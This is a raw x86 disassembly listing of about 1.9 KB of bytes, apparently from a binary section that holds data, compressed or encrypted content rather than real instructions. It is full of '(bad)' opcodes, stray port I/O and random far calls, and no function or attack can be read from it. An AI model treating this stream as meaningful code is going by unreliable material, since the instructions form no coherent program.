  41ce8e:	dec    ecx
  41ce8f:	pop    ebx
  41ce90:	data16 fmul QWORD PTR [esi+0xe132eb5]
  41ce97:	shl    dh,0xc7
  41ce9a:	cmp    eax,0xb84daa8f
  41ce9f:	dec    edi
  41cea0:	sbb    DWORD PTR [esi],esp
  41cea2:	pop    esi
  41cea3:	dec    edx
  41cea4:	mov    bh,0x6a
  41cea6:	or     edi,DWORD PTR [ecx-0x7c]
  41cea9:	inc    ecx
  41ceaa:	(bad)  
  41ceac:	push   0xffffff9d
  41ceae:	scas   al,BYTE PTR es:[edi]
  41ceaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceb0:	shr    dl,cl
  41ceb2:	xchg   edx,eax
  41ceb3:	hlt    
  41ceb4:	(bad)  
  41ceb5:	sbb    DWORD PTR [eax+edx*2+0x3a],edi
  41ceb9:	je     0x41ced2
  41cebb:	iret   
  41cebc:	out    dx,al
  41cebd:	sub    al,0x83
  41cebf:	dec    edx
  41cec0:	fsubr  DWORD PTR [esi+0x0]
  41cec3:	sub    esp,DWORD PTR [edi-0x360e6d72]
  41cec9:	cli    
  41ceca:	jo     0x41ce63
  41cecc:	and    eax,DWORD PTR [edx+0x1]
  41cecf:	fisub  WORD PTR [edi+0x17]
  41ced2:	and    eax,0x8d7d8e74
  41ced7:	add    al,0x6
  41ced9:	out    dx,al
  41ceda:	inc    esp
  41cedb:	sub    edi,DWORD PTR [ebx+0x49a12155]
  41cee1:	inc    edx
  41cee2:	fdiv   DWORD PTR [ebx]
  41cee4:	outs   dx,BYTE PTR ds:[esi]
  41cee5:	add    BYTE PTR [ecx-0x2a],cl
  41cee8:	sub    al,0xa5
  41ceea:	ja     0x41cf33
  41ceec:	jne    0x41cf0d
  41ceee:	ds pop ds
  41cef0:	ret    
  41cef1:	inc    ebp
  41cef2:	push   esi
  41cef3:	cmp    BYTE PTR [eax],bh
  41cef5:	push   0x3a928b66
  41cefa:	gs inc esp
  41cefc:	outs   dx,DWORD PTR ds:[esi]
  41cefd:	xchg   BYTE PTR [esi-0x23e0e646],ah
  41cf03:	popa   
  41cf04:	xchg   edx,eax
  41cf05:	retf   
  41cf06:	dec    ebp
  41cf07:	aam    0x8c
  41cf09:	mov    BYTE PTR [esi],cl
  41cf0b:	lock fldenv [eax+0x5d4a96de]
  41cf12:	loope  0x41cf64
  41cf14:	mov    ds:0x661ce24f,al
  41cf19:	push   esi
  41cf1a:	das    
  41cf1b:	arpl   WORD PTR [edx+0x436f27],sp
  41cf21:	mov    ds:0x47ebb2ac,eax
  41cf26:	ret    0x325c
  41cf29:	pop    ecx
  41cf2a:	ret    0x8904
  41cf2d:	adc    al,ah
  41cf2f:	sub    eax,0x5b7fa7a6
  41cf34:	data16 add al,0xab
  41cf37:	rol    BYTE PTR [edi-0x67],0x21
  41cf3b:	or     DWORD PTR [edx+edx*1-0x67c49dc6],edx
  41cf42:	repz mov bl,0x76
  41cf45:	jns    0x41cf89
  41cf47:	sbb    ebx,DWORD PTR [edx+0x71]
  41cf4a:	int    0x23
  41cf4c:	xchg   esi,eax
  41cf4d:	cmp    al,0x34
  41cf4f:	and    al,0x94
  41cf51:	mov    esp,0x8e89926f
  41cf56:	mov    ds:0x7cff0d21,eax
  41cf5b:	fsub   DWORD PTR [ecx+0x5]
  41cf5e:	jno    0x41cf97
  41cf60:	ret    
  41cf61:	adc    DWORD PTR [ecx+0x7d54d37f],ebp
  41cf67:	mov    ah,0x66
  41cf69:	cmp    eax,0x83519fc7
  41cf6e:	mov    eax,ds:0x2d5096b4
  41cf73:	add    al,0xe6
  41cf75:	stc    
  41cf76:	add    ebx,DWORD PTR [ecx+esi*4-0x9]
  41cf7a:	(bad)  
  41cf7b:	adc    dh,BYTE PTR [edi]
  41cf7d:	add    esp,DWORD PTR [edi-0x6a30e661]
  41cf83:	sub    bl,BYTE PTR [edx]
  41cf85:	retf   0xa909
  41cf88:	sahf   
  41cf89:	retf   0xd534
  41cf8c:	outs   dx,BYTE PTR ds:[esi]
  41cf8d:	dec    ebp
  41cf8e:	in     al,0xf5
  41cf90:	sahf   
  41cf91:	lea    esp,[edx-0x36872289]
  41cf97:	mov    al,ah
  41cf99:	or     esi,DWORD PTR [edx-0x224b3bcf]
  41cf9f:	xchg   ebp,eax
  41cfa0:	es jne 0x41cfab
  41cfa3:	or     al,0x99
  41cfa5:	(bad)  
  41cfa6:	mov    dl,0x12
  41cfa8:	and    BYTE PTR [ecx],cl
  41cfaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfab:	into   
  41cfac:	(bad)  
  41cfad:	loop   0x41cfb8
  41cfaf:	(bad)  
  41cfb1:	add    bl,BYTE PTR [esi+0x64978de5]
  41cfb7:	cmp    DWORD PTR [ebx],edx
  41cfb9:	jecxz  0x41d014
  41cfbb:	and    ch,BYTE PTR [esi-0x76]
  41cfbe:	div    BYTE PTR [eax]
  41cfc0:	frstor [edx+ecx*1-0x490b6494]
  41cfc7:	mov    bl,BYTE PTR [edi]
  41cfc9:	(bad)  
  41cfca:	xor    BYTE PTR [ecx-0x6c],dh
  41cfcd:	not    BYTE PTR [edi+0x68e6dc22]
  41cfd3:	sbb    eax,0xb1c57fc2
  41cfd8:	inc    BYTE PTR [edx]
  41cfda:	or     al,0x7f
  41cfdc:	push   eax
  41cfdd:	retf   0x8b6c
  41cfe0:	dec    ebx
  41cfe1:	or     BYTE PTR [ebx-0x11],0xd2
  41cfe5:	call   0xc2bf75b0
  41cfea:	mov    cs,ecx
  41cfec:	fwait
  41cfed:	adc    eax,0xcd712d3
  41cff2:	dec    ecx
  41cff3:	popa   
  41cff4:	(bad)  
  41cff5:	fld    DWORD PTR [ecx-0x1c626be4]
  41cffb:	sub    eax,0x9e3c9dd6
  41d000:	and    DWORD PTR [ebx+0x6c],ecx
  41d003:	xor    DWORD PTR [edi],esi
  41d005:	or     eax,0xc0afc7df
  41d00a:	cmp    BYTE PTR [eax+eax*2+0xc432897],0xaf
  41d012:	pop    ecx
  41d013:	and    edx,ebp
  41d015:	shl    DWORD PTR [eax-0x178e0652],1
  41d01b:	(bad)  
  41d01c:	popf   
  41d01d:	fisttp WORD PTR ds:0x5881872f
  41d023:	xchg   esi,eax
  41d024:	js     0x41d0a3
  41d026:	mov    cl,0xf1
  41d028:	bound  esi,QWORD PTR [ebx+edx*8]
  41d02b:	test   al,0xe7
  41d02d:	push   ebx
  41d02e:	add    al,0x30
  41d030:	jecxz  0x41cfbe
  41d032:	mov    esp,0x9118870c
  41d037:	xchg   ebx,ebx
  41d039:	imul   esp,DWORD PTR [edi-0x4a2a34c3],0x70
  41d040:	cmp    edi,DWORD PTR [eax-0x5e56de07]
  41d046:	dec    edx
  41d047:	das    
  41d048:	add    BYTE PTR [edx-0x28],ah
  41d04b:	sahf   
  41d04c:	mov    esi,0xa6f010dd
  41d051:	pop    ds
  41d052:	cmp    eax,0xc2351f68
  41d057:	inc    esp
  41d058:	pushf  
  41d059:	popa   
  41d05a:	xor    al,0xfc
  41d05c:	or     ebp,DWORD PTR [esi+esi*4-0x688cf2a3]
  41d063:	iret   
  41d064:	lods   al,BYTE PTR ds:[esi]
  41d065:	iret   
  41d066:	xchg   edx,eax
  41d067:	rcr    BYTE PTR [eax+0x6786802f],cl
  41d06d:	jg     0x41d0eb
  41d06f:	mov    ds:0x26c0748d,al
  41d074:	mov    eax,0x7f97f39c
  41d079:	add    DWORD PTR [edi],edx
  41d07b:	cmp    edx,edi
  41d07d:	sbb    bl,BYTE PTR [edi-0x36]
  41d080:	mov    bh,0x40
  41d082:	jne    0x41d069
  41d084:	mov    al,ds:0x60bfb821
  41d089:	xor    eax,0x847cd2bd
  41d08e:	adc    BYTE PTR [ecx],dl
  41d090:	mov    ch,0x47
  41d092:	test   al,ah
  41d094:	les    edx,FWORD PTR [edi-0x2eff9473]
  41d09a:	ss sbb al,0x7f
  41d09d:	xchg   ebp,eax
  41d09e:	in     eax,dx
  41d09f:	adc    eax,0x933f3539
  41d0a4:	xor    ecx,edx
  41d0a6:	call   0x96224896
  41d0ab:	stc    
  41d0ac:	sbb    BYTE PTR [ecx+eax*8+0x29073a17],dl
  41d0b3:	and    BYTE PTR [edi],0x9c
  41d0b6:	scas   al,BYTE PTR es:[edi]
  41d0b7:	std    
  41d0b8:	data16 fisub WORD PTR [ebx+0x24]
  41d0bc:	mov    eax,ds:0xcac01330
  41d0c1:	cmp    BYTE PTR [esi+edx*1+0x4b],bl
  41d0c5:	jge    0x41d096
  41d0c7:	nop
  41d0c8:	add    DWORD PTR [esi+0x7269eedb],eax
  41d0ce:	cmp    bh,ch
  41d0d0:	pop    edi
  41d0d1:	sub    bh,BYTE PTR [ebp+0x581bb528]
  41d0d7:	add    al,0xb
  41d0d9:	add    ah,BYTE PTR [ebx+esi*4+0x3b]
  41d0dd:	xchg   BYTE PTR [ecx+0x41],cl
  41d0e0:	sbb    edx,esp
  41d0e2:	push   0x286f36ec
  41d0e7:	out    0x53,eax
  41d0e9:	sar    DWORD PTR [eax+0x12d809b2],cl
  41d0ef:	aaa    
  41d0f0:	shl    DWORD PTR ds:0xb93d323e,1
  41d0f6:	and    dh,BYTE PTR [eax+0x67a9b4d4]
  41d0fc:	out    0xb6,al
  41d0fe:	loopne 0x41d08d
  41d100:	repnz sbb al,0x6a
  41d103:	mov    ebx,0x12a9250b
  41d108:	sahf   
  41d109:	adc    BYTE PTR [esi-0x59],dh
  41d10c:	(bad)  
  41d10d:	retf   0x9e7a
  41d110:	xchg   esp,eax
  41d111:	cwde   
  41d112:	sbb    dl,BYTE PTR [edx]
  41d114:	cs retf 0xdf8c
  41d118:	scas   al,BYTE PTR es:[edi]
  41d119:	data16 xchg BYTE PTR [esi],ah
  41d11c:	loopne 0x41d0ba
  41d11e:	scas   eax,DWORD PTR es:[edi]
  41d11f:	mov    edi,0x8ed88e3a
  41d124:	(bad)  
  41d125:	mov    cl,0xea
  41d127:	gs pop esi
  41d129:	sbb    cl,0x48
  41d12c:	push   eax
  41d12d:	push   ebp
  41d12e:	mov    ebx,0xcf732330
  41d133:	ins    DWORD PTR es:[edi],dx
  41d134:	int3   
  41d135:	call   0xe4f153f2
  41d13a:	das    
  41d13b:	out    0xbc,eax
  41d13d:	fidivr DWORD PTR [esi+0x5af385c1]
  41d143:	adc    cl,0x55
  41d146:	pop    ecx
  41d147:	xchg   esp,eax
  41d148:	hlt    
  41d149:	adc    dh,BYTE PTR [ecx-0x165fb814]
  41d14f:	jle    0x41d0fa
  41d151:	scas   eax,DWORD PTR es:[edi]
  41d152:	and    bl,0x2e
  41d155:	arpl   WORD PTR [ecx+edx*1],sp
  41d158:	test   al,0x4e
  41d15a:	jle    0x41d0f9
  41d15c:	mov    cl,bl
  41d15e:	push   ds
  41d15f:	std    
  41d160:	push   0x39
  41d162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d163:	fist   WORD PTR [ebx-0x1c5d30ee]
  41d169:	les    esi,FWORD PTR ds:0xd4fc4463
  41d16f:	jb     0x41d15c
  41d171:	loop   0x41d135
  41d173:	cmp    ch,BYTE PTR [ecx+ebp*1-0x352db3c6]
  41d17a:	sahf   
  41d17b:	adc    al,0xd1
  41d17d:	outs   dx,BYTE PTR fs:[esi]
  41d17f:	out    dx,eax
  41d180:	jle    0x41d132
  41d182:	adc    ah,bl
  41d184:	adc    BYTE PTR [edi+0x7ac82822],dl
  41d18a:	xor    cl,ah
  41d18c:	pusha  
  41d18d:	xlat   BYTE PTR ds:[ebx]
  41d18e:	mov    al,0x87
  41d190:	dec    DWORD PTR [edi]
  41d192:	mov    dh,0xda
  41d194:	add    esi,DWORD PTR [ebx-0xc]
  41d197:	ja     0x41d1fa
  41d199:	push   ss
  41d19a:	pop    ebp
  41d19b:	and    al,0xed
  41d19d:	jno    0x41d209
  41d19f:	add    al,0x83
  41d1a1:	mov    ds:0x114a7d4a,al
  41d1a6:	jl     0x41d1e2
  41d1a8:	das    
  41d1a9:	sbb    ebx,esp
  41d1ab:	js     0x41d20a
  41d1ad:	sahf   
  41d1ae:	lods   eax,DWORD PTR ds:[si]
  41d1b0:	and    eax,0x43522068
  41d1b5:	mov    al,ds:0x6e339a93
  41d1ba:	fdivr  QWORD PTR [esi]
  41d1bc:	dec    eax
  41d1bd:	xor    bl,dh
  41d1bf:	sti    
  41d1c0:	add    BYTE PTR [ebx+0x56],0x7d
  41d1c4:	retf   
  41d1c5:	fisub  DWORD PTR [ebx]
  41d1c7:	in     al,dx
  41d1c8:	(bad)  
  41d1c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1ca:	and    DWORD PTR [eax],ebx
  41d1cc:	add    ebx,DWORD PTR [ecx-0x52]
  41d1cf:	lds    edi,FWORD PTR [ebx+0x2b1a9b5c]
  41d1d5:	or     BYTE PTR [edx+0x59],ah
  41d1d8:	cmp    ecx,DWORD PTR [ebx]
  41d1da:	ror    BYTE PTR [edx-0x24],cl
  41d1dd:	(bad)  
  41d1de:	out    dx,al
  41d1df:	les    edi,FWORD PTR [edx]
  41d1e1:	xchg   ebp,ebp
  41d1e3:	ret    0x7b3a
  41d1e6:	and    cl,dh
  41d1e8:	outs   dx,DWORD PTR ds:[esi]
  41d1e9:	inc    eax
  41d1ea:	jmp    0x8fb8f2fc
  41d1ef:	test   al,0x8d
  41d1f1:	mov    ecx,0x87fecf17
  41d1f6:	in     eax,0xe3
  41d1f8:	jmp    0xdcc667bb
  41d1fd:	fsubr  DWORD PTR [ecx+0x2d]
  41d200:	mov    ebp,0x85469a9a
  41d205:	xchg   edi,eax
  41d206:	push   ecx
  41d207:	loopne 0x41d19c
  41d209:	fbld   TBYTE PTR [edi+0x24]
  41d20c:	ja     0x41d1c0
  41d20e:	popf   
  41d20f:	xchg   edi,eax
  41d210:	test   al,0xbe
  41d212:	jg     0x41d1c4
  41d214:	dec    ebx
  41d215:	xchg   DWORD PTR [ecx+edx*4+0x13],ecx
  41d219:	sub    esi,DWORD PTR [eax-0x72cb7ba4]
  41d21f:	and    al,0xdf
  41d221:	ret    0x8a81
  41d224:	push   ecx
  41d225:	cmp    DWORD PTR [edi],esi
  41d227:	mov    ecx,0xf93cd8ef
  41d22c:	in     al,0x27
  41d22e:	pop    esi
  41d22f:	dec    edi
  41d230:	sbb    BYTE PTR [esi-0x285b9a50],dh
  41d236:	or     DWORD PTR [edi+0x3a6b8491],ebx
  41d23c:	loop   0x41d1cd
  41d23e:	xlat   BYTE PTR ds:[ebx]
  41d23f:	pop    esi
  41d240:	mul    ebp
  41d242:	mov    eax,0x28851a20
  41d247:	out    dx,eax
  41d248:	mov    esp,0x627430ce
  41d24d:	jne    0x41d27f
  41d24f:	jb     0x41d1d3
  41d251:	sbb    BYTE PTR [ecx+0x40],bl
  41d254:	mov    ah,0x32
  41d256:	dec    eax
  41d257:	(bad)  
  41d258:	push   ebp
  41d259:	nop
  41d25a:	jns    0x41d223
  41d25c:	ror    DWORD PTR [edx],0x95
  41d25f:	and    dl,BYTE PTR [esp+edx*2+0x5b]
  41d263:	add    al,0xa
  41d265:	les    ecx,FWORD PTR [eax+ebx*1]
  41d268:	into   
  41d269:	icebp  
  41d26a:	cmp    edi,edx
  41d26c:	ret    0x6c79
  41d26f:	and    bl,BYTE PTR [eax]
  41d271:	out    dx,al
  41d272:	out    dx,eax
  41d273:	lods   eax,DWORD PTR ds:[esi]
  41d274:	outs   dx,DWORD PTR ds:[esi]
  41d275:	dec    ebp
  41d276:	push   cs
  41d277:	add    eax,0xcedfadf6
  41d27c:	or     al,0x2d
  41d27e:	and    DWORD PTR [eax+0x31],ecx
  41d281:	mov    ebx,0x389129c9
  41d286:	and    esi,DWORD PTR [edx]
  41d288:	mov    eax,ds:0xcb25cfc1
  41d28d:	loopne 0x41d2b2
  41d28f:	mov    ebp,0xe761983d
  41d294:	gs iret 
  41d296:	cmc    
  41d297:	push   edi
  41d298:	pop    edx
  41d299:	mov    ecx,0xf877a809
  41d29e:	mov    ebp,0xba75306c
  41d2a3:	stc    
  41d2a4:	or     edi,DWORD PTR [eax-0x1e13fb7]
  41d2aa:	bound  ebp,QWORD PTR [edx]
  41d2ac:	add    eax,0x6797d911
  41d2b1:	xchg   esi,eax
  41d2b2:	rol    dh,0x89
  41d2b5:	xor    ah,BYTE PTR [ebx+0x26]
  41d2b8:	popf   
  41d2b9:	adc    eax,DWORD PTR ds:0xcd850084
  41d2bf:	mov    ch,0xad
  41d2c1:	mov    eax,0xcb9f587c
  41d2c6:	xchg   ecx,eax
  41d2c7:	ss in  eax,dx
  41d2c9:	mov    BYTE PTR [edx+0x7bb57972],ah
  41d2cf:	push   0x2ff90f0c
  41d2d4:	add    edx,ebp
  41d2d6:	dec    esi
  41d2d7:	sub    DWORD PTR [ecx],edi
  41d2d9:	fsubr  QWORD PTR [eax+0x8e84813]
  41d2df:	into   
  41d2e0:	hlt    
  41d2e1:	mov    ds:0xba07cdf7,eax
  41d2e6:	mov    edi,0x76db5fa0
  41d2eb:	pop    edi
  41d2ec:	mov    ds:0xfd10154a,al
  41d2f1:	test   BYTE PTR [ecx+0xee06d3],al
  41d2f7:	out    0xba,eax
  41d2f9:	inc    esi
  41d2fa:	call   0xc158:0x218b8555
  41d301:	add    DWORD PTR [esp+edx*2+0x30],edx
  41d305:	push   cs
  41d306:	pop    ebx
  41d307:	adc    eax,0x150f6592
  41d30c:	lock sbb BYTE PTR [esi],cl
  41d30f:	adc    BYTE PTR [edi-0x24],dh
  41d312:	or     esi,DWORD PTR [ebp-0x21]
  41d315:	arpl   WORD PTR [esi+eiz*4+0x2dfced25],bp
  41d31c:	and    esi,DWORD PTR [edi+0x163a7768]
  41d322:	popa   
  41d323:	in     eax,dx
  41d324:	sbb    ch,al
  41d326:	or     bl,dl
  41d328:	xor    cl,BYTE PTR [ebp+edx*4-0x3fbc7bf8]
  41d32f:	in     al,0x16
  41d331:	adc    dh,0x27
  41d334:	bound  eax,QWORD PTR [edi+0x15]
  41d337:	pop    ecx
  41d338:	xlat   BYTE PTR ds:[ebx]
  41d339:	jae    0x41d34d
  41d33b:	mul    DWORD PTR [ebx-0x39]
  41d33e:	loopne 0x41d38e
  41d340:	sub    DWORD PTR [ebx+0x6e30fca5],esi
  41d346:	mov    ch,0xda
  41d348:	(bad)  
  41d349:	xchg   edx,eax
  41d34a:	lahf   
  41d34b:	dec    edx
  41d34c:	mov    ds:0xdda01f35,al
  41d351:	ins    BYTE PTR es:[edi],dx
  41d352:	sub    BYTE PTR [ebx+esi*8-0x7b],dh
  41d356:	mov    WORD PTR [edi+0x65fe8060],?
  41d35c:	loop   0x41d350
  41d35e:	repnz push esp
  41d360:	dec    edx
  41d361:	sub    edx,DWORD PTR [edx+edx*8+0x18]
  41d365:	add    BYTE PTR [edi-0x76],cl
  41d368:	inc    eax
  41d369:	dec    ebx
  41d36a:	inc    esi
  41d36b:	shl    DWORD PTR [edi],1
  41d36d:	adc    ebp,edi
  41d36f:	pop    ecx
  41d370:	and    ecx,esi
  41d372:	add    ebp,esp
  41d374:	sub    al,0xb8
  41d376:	adc    DWORD PTR [edx*2-0x6310e9a7],esi
  41d37d:	and    DWORD PTR [ebp-0x2],esi
  41d380:	mov    ds:0xfd23e77e,al
  41d385:	mov    ebx,0x1d87baa9
  41d38a:	mov    ch,0x45
  41d38c:	cwde   
  41d38d:	shr    DWORD PTR [ecx+0x7f13699e],0xc2
  41d394:	fdivp  st(3),st
  41d396:	jns    0x41d3f0
  41d398:	loop   0x41d39e
  41d39a:	sar    DWORD PTR [edx+edi*4-0x23bfa576],cl
  41d3a1:	inc    BYTE PTR [esi]
  41d3a3:	xlat   BYTE PTR ds:[ebx]
  41d3a4:	es mov cl,0xcd
  41d3a7:	jo     0x41d3ab
  41d3a9:	pop    ecx
  41d3aa:	loope  0x41d34d
  41d3ac:	shl    ebx,1
  41d3ae:	test   al,0xd1
  41d3b0:	xchg   esi,eax
  41d3b1:	cmp    DWORD PTR [edi+0x43],edi
  41d3b4:	sbb    al,0xef
  41d3b6:	inc    esi
  41d3b7:	cli    
  41d3b8:	fimul  DWORD PTR [edx+0x2b]
  41d3bb:	retf   
  41d3bc:	mov    ch,0x31
  41d3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3bf:	dec    esp
  41d3c0:	test   eax,0xe7697ea2
  41d3c5:	adc    ebp,DWORD PTR [edx+0x44]
  41d3c8:	leave  
  41d3c9:	les    esi,FWORD PTR [edx+0x20]
  41d3cc:	popa   
  41d3cd:	ins    BYTE PTR es:[edi],dx
  41d3ce:	(bad)  
  41d3cf:	pop    eax
  41d3d0:	cwde   
  41d3d1:	outs   dx,BYTE PTR ds:[esi]
  41d3d2:	repnz (bad) 
  41d3d4:	push   edx
  41d3d5:	sub    dl,BYTE PTR ds:0xf0af5e0a
  41d3db:	jg     0x41d41e
  41d3dd:	cmp    cl,ch
  41d3df:	mov    BYTE PTR [edi],0x1b
  41d3e2:	lahf   
  41d3e3:	push   esp
  41d3e4:	mov    al,ds:0x707056ff
  41d3e9:	jae    0x41d432
  41d3eb:	cmp    BYTE PTR [esi-0x8],ah
  41d3ee:	cmp    esi,esp
  41d3f0:	mov    ebp,0x46edb352
  41d3f5:	mov    ecx,0xa7bd45f6
  41d3fa:	in     al,dx
  41d3fb:	pop    ebx
  41d3fc:	nop
  41d3fd:	sbb    bh,cl
  41d3ff:	fisub  DWORD PTR [ebp-0x80bb840]
  41d405:	cdq    
  41d406:	sub    ecx,DWORD PTR [ecx]
  41d408:	adc    esi,esi
  41d40a:	mov    al,ds:0xb7f74b29
  41d40f:	mov    edx,0x9e64877
  41d414:	sahf   
  41d415:	sti    
  41d416:	mov    eax,0xe2344f5
  41d41b:	outs   dx,BYTE PTR ds:[esi]
  41d41c:	push   ebx
  41d41d:	lock dec edx
  41d41f:	jecxz  0x41d3a3
  41d421:	out    0x8d,al
  41d423:	adc    eax,0x5c65164d
  41d428:	jae    0x41d3ca
  41d42a:	pop    ebp
  41d42b:	int    0xdc
  41d42d:	mov    ah,0xd2
  41d42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d430:	jle    0x41d46f
  41d432:	mov    al,0xc6
  41d434:	pop    ss
  41d435:	outs   dx,DWORD PTR ds:[esi]
  41d436:	arpl   WORD PTR [eax-0x16],si
  41d439:	scas   eax,DWORD PTR es:[edi]
  41d43a:	xchg   edi,eax
  41d43b:	mov    ah,0x1b
  41d43d:	or     cl,cl
  41d43f:	pushf  
  41d440:	xchg   DWORD PTR [esi],edi
  41d442:	mov    ss,WORD PTR [edx+ecx*1+0x3dd434a]
  41d449:	cmc    
  41d44a:	xchg   edi,eax
  41d44b:	in     al,0x3c
  41d44d:	div    BYTE PTR [ebp+0x5efbd5e]
  41d453:	loop   0x41d3ef
  41d455:	cwde   
  41d456:	and    eax,0x28a97ae9
  41d45b:	cmp    DWORD PTR ds:0xd0a1d394,0x1fc1a86d
  41d465:	dec    eax
  41d466:	mov    al,ds:0x56256220
  41d46b:	add    esp,DWORD PTR [ebp-0x21]
  41d46e:	div    DWORD PTR [edi]
  41d470:	arpl   WORD PTR ds:0x165137fa,ax
  41d476:	jle    0x41d4cb
  41d478:	jno    0x41d4e9
  41d47a:	adc    eax,0xefcdc540
  41d47f:	or     dl,BYTE PTR [edx-0x32]
  41d482:	setbe  dl
  41d485:	imul   BYTE PTR [edi+esi*2]
  41d488:	lock xchg ebp,eax
  41d48a:	add    eax,0xf8960323
  41d48f:	nop
  41d490:	and    BYTE PTR [edi],ch
  41d492:	adc    DWORD PTR [esi],ecx
  41d494:	sub    edi,DWORD PTR [edi]
  41d496:	cmp    bh,BYTE PTR [ecx+eiz*2-0x62e5c29]
  41d49d:	adc    eax,0x837d6457
  41d4a2:	sbb    DWORD PTR [eax],ecx
  41d4a4:	mov    ds:0x13cf5b2c,eax
  41d4a9:	and    DWORD PTR [ebx+0x6869434],esi
  41d4af:	fxtract 
  41d4b1:	out    0xad,al
  41d4b3:	imul   ebp,edi,0x603d2acf
  41d4b9:	push   0x6f
  41d4bb:	push   esi
  41d4bd:	or     eax,DWORD PTR [ebp+0x57]
  41d4c0:	adc    eax,0xd91d8f39
  41d4c5:	adc    BYTE PTR [ebp-0x4f67a98],al
  41d4cb:	test   BYTE PTR [edx],0x51
  41d4ce:	jo     0x41d500
  41d4d0:	jle    0x41d460
  41d4d2:	add    al,cl
  41d4d4:	cld    
  41d4d5:	fimul  DWORD PTR [ebx-0x53cdc91a]
  41d4db:	jbe    0x41d48b
  41d4dd:	or     DWORD PTR [ebp-0x4c6254ed],edi
  41d4e3:	sub    BYTE PTR [esi],dl
  41d4e5:	ja     0x41d4c2
  41d4e7:	inc    esp
  41d4e8:	pop    edx
  41d4e9:	push   esp
  41d4ea:	jge    0x41d564
  41d4ec:	mov    ebx,gs
  41d4ee:	retf   0x83e2
  41d4f1:	arpl   si,cx
  41d4f3:	jecxz  0x41d47c
  41d4f5:	je     0x41d494
  41d4f7:	jle    0x41d559
  41d4f9:	call   0x426:0x43f1d4a4
  41d500:	xchg   ebx,eax
  41d501:	mov    edx,0xd96f9a5e
  41d506:	adc    DWORD PTR [ebp+ebp*2-0x723260e2],esp
  41d50d:	es jnp 0x41d54d
  41d510:	jmp    0x55450b7e
  41d515:	test   eax,0x4884e37e
  41d51a:	mov    ebp,0xd76f876
  41d51f:	sbb    al,cl
  41d521:	push   ebp
  41d522:	dec    ebx
  41d523:	mov    ebp,0x759648b5
  41d528:	sbb    al,0xe7
  41d52a:	scas   eax,DWORD PTR es:[edi]
  41d52b:	inc    ebx
  41d52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d52d:	aad    0x76
  41d52f:	rol    DWORD PTR [ebx],0xd9
  41d532:	sbb    dl,BYTE PTR [eax-0x5dc8fba7]
  41d538:	(bad)  
  41d539:	xchg   ecx,eax
  41d53a:	adc    BYTE PTR ds:0x22ffb6f3,0x71
  41d541:	(bad)  
  41d542:	das    
  41d543:	into   
  41d544:	dec    ebx
  41d545:	xchg   BYTE PTR [eax-0xd],cl
  41d548:	gs adc ch,ah
  41d54b:	jns    0x41d514
  41d54d:	jecxz  0x41d5b7
  41d54f:	mov    ch,0x6d
  41d551:	adc    eax,DWORD PTR [ecx-0x6b37de5d]
  41d557:	push   ds
  41d558:	test   al,0x82
  41d55a:	sbb    ebp,DWORD PTR [edx]
  41d55c:	jbe    0x41d509
  41d55e:	ret    0x6374
  41d561:	xchg   ebp,eax
  41d562:	and    al,bh
  41d564:	jo     0x41d57e
  41d566:	fsubr  st(5),st
  41d568:	test   DWORD PTR [eax+0x4d2c0a08],0xa774cae4
  41d572:	add    DWORD PTR [edx],ebp
  41d574:	sbb    DWORD PTR [ecx+0x37],0xffffff86
  41d578:	into   
  41d579:	int    0x5a
  41d57b:	loope  0x41d52f
  41d57d:	test   BYTE PTR [edx-0x3e],ah
  41d580:	mov    ebp,0x75e2c799
  41d585:	push   ecx
  41d586:	and    al,bh
  41d588:	jbe    0x41d59c
  41d58a:	inc    eax
  41d58b:	xchg   ecx,eax
  41d58c:	in     al,0xf2
  41d58e:	lds    esp,FWORD PTR [esi+eax*8+0x29]
  41d592:	shl    ah,0xb6
  41d595:	inc    ebx
  41d596:	addr16 test al,0xa1
  41d599:	(bad)  
  41d59a:	mov    ebp,eax
  41d59c:	clc    
  41d59d:	fwait
  41d59e:	lea    ebp,[edi]
  41d5a0:	je     0x41d533
  41d5a2:	inc    eax
  41d5a3:	push   ecx
  41d5a4:	jns    0x41d5b7
  41d5a6:	xchg   BYTE PTR [edx],bl
  41d5a8:	jns    0x41d56e
  41d5aa:	push   edi
  41d5ab:	sbb    eax,0xe476c063
  41d5b0:	pop    ds
  41d5b1:	mov    eax,ds:0xa8139518
  41d5b6:	mov    esi,0x4d1e9566
  41d5bb:	stos   DWORD PTR es:[edi],eax
  41d5bc:	add    BYTE PTR [eax-0x29cce8b],dl
  41d5c2:	in     eax,dx
  41d5c3:	and    bl,ah
  41d5c5:	dec    ebp
  41d5c6:	clc    
  41d5c7:	ss jno 0x41d5fc
  41d5ca:	adc    eax,0xaa40df60
  41d5cf:	pop    esi
  41d5d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5d1:	xchg   edx,eax
  41d5d2:	and    eax,0x871cd1f7
  41d5d7:	jecxz  0x41d5e9
  41d5d9:	push   ebp
  41d5da:	call   DWORD PTR [ebx-0x31f704da]
  41d5e0:	test   DWORD PTR [edx+0x13],ecx
  41d5e3:	jge    0x41d5a0
  41d5e5:	daa    
  41d5e6:	lds    di,DWORD PTR [edi+0x28]
  41d5ea:	cmp    ebx,esi
  41d5ec:	call   0xfc1c:0x9e107801
  41d5f3:	inc    esi
  41d5f4:	mov    bl,0xb1
  41d5f6:	sar    DWORD PTR [esi],0xaf
  41d5f9:	js     0x41d65a
  41d5fb:	lock pop eax
  41d5fd:	aad    0xd3
  41d5ff:	and    BYTE PTR [ebp+0x8e1d6f7],0xf6
  41d606:	hlt    
  41d607:	push   edi
  41d608:	outs   dx,BYTE PTR ds:[esi]
  41d609:	repz jle 0x41d5fa
  41d60c:	add    al,0x6c
  41d60e:	(bad)  
  41d60f:	call   0xc964:0x4b023797
  41d616:	cs push es
  41d618:	(bad)  
  41d619:	jmp    0x458f4179
  41d61e:	mov    ebp,0xbac85629
  41d623:	push   ecx
  41d624:	push   ecx
  41d625:	xchg   esi,eax
  41d626:	hlt    
  41d627:	jle    0x41d686
  41d629:	dec    esi
  41d62a:	fidivr WORD PTR [edx]
  41d62c:	push   ebx
  41d62d:	sub    edi,DWORD PTR [edx-0x54]
  41d630:	cs (bad) 
  41d632:	cmc    
